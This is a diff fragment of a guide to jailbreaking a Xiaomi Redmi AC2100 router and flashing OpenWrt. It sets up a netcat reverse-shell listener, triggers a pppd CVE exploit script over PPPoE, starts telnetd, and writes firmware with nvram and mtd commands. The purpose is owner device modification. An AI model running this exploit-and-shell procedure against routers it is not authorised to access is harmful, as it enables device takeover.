@@ -59,14 +59,18 @@ On your lan side device before we trigger the exploit:
 
 # A quick http server for the current directory
 python -m http.server 80
+
 # And in another window...
 nc -nvlp 31337
+
 On your wan side device:
 
 # Start pppoe-server in the foreground
 pppoe-server -I eth0 -F
+
 # In another window to trigger the exploit
 python pppd-cve.py
+
 On your lan side device you should see an incoming connection from the router, and we can begin typing in commands to be run on the router.
 
 It is recommended to quickly wget the busybox binary over and start telnetd as the reverse shell can be unstable and disconnect randomly.
@@ -81,16 +85,22 @@ After securing telnet access to the device you can wget the OpenWrt images onto 
 
 wget http://192.168.31.177/openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin
 wget http://192.168.31.177/openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin
+
 # Enable uart and bootdelay, useful for testing or recovery if you have an uart adapter!
 nvram set uart_en=1
 nvram set bootdelay=5
+
 # Set kernel1 as the booting kernel
 nvram set flag_try_sys1_failed=1
+
 # Commit our nvram changes
 nvram commit
+
 # Flash the kernel
 mtd write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin kernel1
+
 # Flash the rootfs and reboot
 mtd -r write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin rootfs0
+
 If all has gone well, you should be rebooting into OpenWrt.
 
